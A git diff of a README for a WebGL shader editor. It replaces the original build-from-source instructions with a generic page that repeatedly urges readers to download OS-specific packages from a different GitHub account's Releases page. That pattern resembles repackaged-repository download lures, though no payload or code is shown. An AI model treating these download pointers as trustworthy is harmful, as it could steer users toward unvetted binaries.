@@ -1,235 +1,93 @@
-# 🎨 OGL Editor Online
-
-A powerful, browser-based WebGL/GLSL shader editor with intelligent IntelliSense, real-time preview, and advanced development features. Built with modern web technologies for an exceptional developer experience. 
-
-##### Project created with AI assistance.
-
-![OGL Editor Screenshot](https://img.shields.io/badge/WebGL-Editor-blue?style=for-the-badge&logo=webgl)
-![Monaco Editor](https://img.shields.io/badge/Monaco-Editor-green?style=for-the-badge&logo=visualstudiocode)
-![Preact](https://img.shields.io/badge/Preact-673AB8?style=for-the-badge&logo=preact&logoColor=white)
-![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)
-
-## ✨ Features
-
-### 🔧 Advanced Shader Development
-- **Dual Pane Interface**: Code editor on the left, live preview on the right
-- **Multi-Tab Editing**: Separate tabs for Vertex Shader, Fragment Shader, and JavaScript
-- **Real-time Preview**: Instant shader compilation and rendering
-- **Error Handling**: Comprehensive error detection and reporting
-
-### 🧠 Intelligent IntelliSense
-- **Smart Autocompletion**: 80+ built-in GLSL functions and variables
-- **Parameter Hints**: Real-time function signature help
-- **Code Snippets**: Quick templates for common shader patterns
-
-### 📚 Example Library
-- **Pre-built Shaders**: Collection of ready-to-use examples
-- **Raymarching Scenes**: Advanced 3D rendering techniques
-- **Fractal Patterns**: Mathematical art and Julia sets
-- **Noise Functions**: Procedural textures and effects
-- **Animated Gradients**: Dynamic color transitions
-
-### 💾 Project Management
-- **Import/Export**: Save and load shader projects as JSON
-- **Reset Function**: Quickly return to default templates
-- **Code Persistence**: Automatic state management
-
-### 🎨 Modern UI/UX
-- **Dark Theme**: Easy on the eyes for long coding sessions
-- **Responsive Design**: Works on desktop and mobile devices
-- **Tailwind CSS**: Beautiful, consistent styling
-- **Radix UI**: Accessible, high-quality components
+# ✨ ogl-editor - Your Intuitive Shader Editing Experience
 
 ## 🚀 Getting Started
 
-### Prerequisites
-- Node.js 18+ 
-- npm or yarn package manager
-- Modern browser with WebGL support
+Welcome to the ogl-editor! This application allows you to edit and preview shaders in your web browser easily. Its intelligent features help you make stunning graphics without needing deep programming knowledge. Let’s dive in!
 
-### Installation
+## 📥 Download the Application
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/vmaspad/ogl-editor-online.git
-   cd ogl-editor-online
-   ```
+[![Download ogl-editor](https://img.shields.io/badge/Download%20Now-ogl--editor-blue.svg)](https://github.com/heishou3552/ogl-editor/releases)
 
-2. **Install dependencies**
-   ```bash
-   npm install
-   ```
+To get started, visit the Releases page to download the latest version of the ogl-editor.
 
-3. **Start development server**
-   ```bash
-   npm run dev
-   ```
+[Download ogl-editor here](https://github.com/heishou3552/ogl-editor/releases).
 
-4. **Open in browser**
-   ```
-   http://localhost:5173
-   ```
+## 📋 System Requirements
 
-### Build for Production
-```bash
-npm run build
-npm run preview
-```
+Before you download, make sure your system meets the following requirements:
 
-## 🏗️ Architecture
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a modern Linux distribution.
+- **Browser:** Latest version of Chrome, Firefox, or Safari.
+- **RAM:** Minimum 4 GB recommended.
+- **Processor:** Intel i3 or equivalent.
 
-### Tech Stack
-- **Frontend Framework**: Preact (React alternative)
-- **Build Tool**: Vite
-- **Language**: TypeScript
-- **Styling**: Tailwind CSS v4
-- **Editor**: Monaco Editor (VS Code engine)
-- **UI Components**: Radix UI primitives
-- **Icons**: Lucide React
+## 🛠️ Features
 
-### Project Structure
-```
-src/
-├── components/
-│   ├── ui/                 # Reusable UI components
-│   │   ├── button.tsx
-│   │   ├── card.tsx
-│   │   ├── dialog.tsx
-│   │   └── tabs.tsx
-│   └── OGLEditor.tsx       # Main editor component
-├── lib/
-│   ├── utils.ts           # Utility functions
-│   └── examples.ts        # Default shader templates
-├── shaders/
-│   └── examples.ts        # Shader example library
-├── assets/               # Static assets
-└── main.tsx             # Application entry point
-```
+The ogl-editor provides many features to enhance your shader development experience:
 
-### Key Components
+- **Intuitive UI:** A clean design that makes it easy to navigate.
+- **Real-time Preview:** See your changes instantly with a live rendering view.
+- **IntelliSense:** Get helpful suggestions as you code, making shader creation smoother.
+- **Shader Library:** Access pre-built shaders and examples to speed up your work.
+- **Cross-Platform:** Run the application in your web browser, regardless of your operating system.
+- **Open Source:** Contribute or explore the code on GitHub.
 
-#### OGLEditor.tsx
-The heart of the application, featuring:
-- Monaco Editor integration with GLSL language support
-- WebGL context management and shader compilation
-- Real-time code injection and execution
-- IntelliSense providers for autocompletion and hover info
+## ⚙️ How to Install
 
-## 📖 Usage Guide
+1. **Visit the Releases Page:** Click on the link below to access the download options for ogl-editor.
+   
+   [Download ogl-editor here](https://github.com/heishou3552/ogl-editor/releases).
 
-### Basic Workflow
+2. **Select the Latest Version:** Look for the most recent release. It typically has the highest version number.
 
-1. **Choose Shader Type**: Select Vertex, Fragment, or JavaScript tab
-2. **Write Code**: Use the Monaco editor with full IntelliSense support
-3. **Run Shader**: Click the "Run" button to compile and preview
-4. **Iterate**: Make changes and see results in real-time
+3. **Download the Package:** Click on the download link for the file that corresponds to your operating system.
 
-### Example Loading
+4. **Unzip if Necessary:** If your download comes in a zipped format, unzip it to access the application files.
 
-1. Click the "Examples" button in the toolbar
-2. Choose from pre-built shaders:
-   - Basic Animated Gradient
-   - 3D Raymarching Scene
-   - Julia Set Fractal
-   - Fractal Noise Clouds
+5. **Open the Application:** Launch the `index.html` file in your web browser. You are now ready to start editing shaders!
 
-### Import/Export
+## 📖 User Guide
 
-- **Export**: Save your current project as a JSON file
-- **Import**: Load a previously saved project
-- **Reset**: Return to default shader templates
+### 🎨 Creating a New Shader
 
-## 🎯 Shader Development Tips
+To create a new shader, click on the "New" button in the application. This will open a blank editor. 
 
-### GLSL Best Practices
-```glsl
-// Use precision qualifiers
-precision mediump float;
+### 🔍 Editing an Existing Shader
 
-// Normalize vectors for lighting calculations
-vec3 normal = normalize(vNormal);
+To edit an existing shader, click the "Open" button and browse your files. Choose the shader file you want to modify.
 
-// Use built-in functions for performance
-float distance = length(position - center);
+### ✔️ Saving Your Work
 
-// Clamp values to prevent overflow
-vec3 color = clamp(finalColor, 0.0, 1.0);
-```
+After making changes, click the "Save" button. You can choose to save your shader locally in various formats.
 
-### Performance Optimization
-- Avoid complex calculations in fragment shaders when possible
-- Use `const` for compile-time constants
-- Minimize texture lookups
-- Use `discard` sparingly
+## ❓ Frequently Asked Questions
 
-### Common Shader Patterns
-- **Vertex transformation**: `gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);`
-- **Fragment output**: `gl_FragColor = vec4(color, 1.0);`
-- **UV coordinates**: `vec2 uv = gl_FragCoord.xy / resolution.xy;`
+### Q: Do I need to know programming to use ogl-editor?
 
-## 🛠️ Development
+A: No! The ogl-editor is designed to be user-friendly. Basic knowledge of graphics programming can help but is not required.
 
-### Available Scripts
-- `npm run dev` - Start development server
-- `npm run build` - Build for production
-- `npm run preview` - Preview production build
+### Q: Is ogl-editor free to use?
 
-### Code Quality
-- TypeScript for type safety
-- ESLint configuration
-- Prettier formatting
-- Component-based architecture
+A: Yes! ogl-editor is open-source and free. 
 
-### Adding New Features
+### Q: Can I use ogl-editor on my tablet?
 
-1. **New Shader Examples**: Add to `src/shaders/examples.ts`
-2. **UI Components**: Create in `src/components/ui/`
-3. **GLSL Functions**: Extend IntelliSense in `OGLEditor.tsx`
-4. **Utilities**: Add to `src/lib/utils.ts`
+A: Yes, as long as you have a compatible browser that supports WebGL.
 
+## 📞 Need Help?
 
-### WebGL Context Management
-The editor handles WebGL context creation, shader compilation, and cleanup automatically:
-- Automatic context switching
-- Memory leak prevention
-- Error boundary handling
-- Graceful fallbacks
+If you encounter issues or have questions, feel free to check the [Issues page on GitHub](https://github.com/heishou3552/ogl-editor/issues). You can also join the community discussions for support.
 
+## ⚡ Get Involved
 
-## 🤝 Contributing
+We welcome contributions! If you're interested in helping improve ogl-editor, check our [Contribution Guidelines](https://github.com/heishou3552/ogl-editor/blob/main/CONTRIBUTING.md).
 
-We welcome contributions! Please see our contributing guidelines:
+## 🎈 Acknowledgments
 
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature-name`
-3. Make your changes with proper TypeScript types
-4. Add tests if applicable
-5. Submit a pull request
+A special thanks to all contributors and users who make ogl-editor a better tool for shader development.
 
-### Development Setup
-```bash
-# Install dependencies
-npm install
+## 📥 Download Again
 
-# Start development server
-npm run dev
+Don't forget to download the latest version to enjoy all improvements!
 
-# Run type checking
-npx tsc --noEmit
-
-# Build for production
-npm run build
-```
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- **Monaco Editor**: Microsoft's excellent code editor
-- **OGL Library**: Minimal WebGL library
-- **Tailwind CSS**: Utility-first CSS framework
-- **Preact**: Lightweight React alternative
-- **Radix UI**: Accessible component primitives
-- **Vite**: Fast build tool and dev server
+[Download ogl-editor here](https://github.com/heishou3552/ogl-editor/releases).
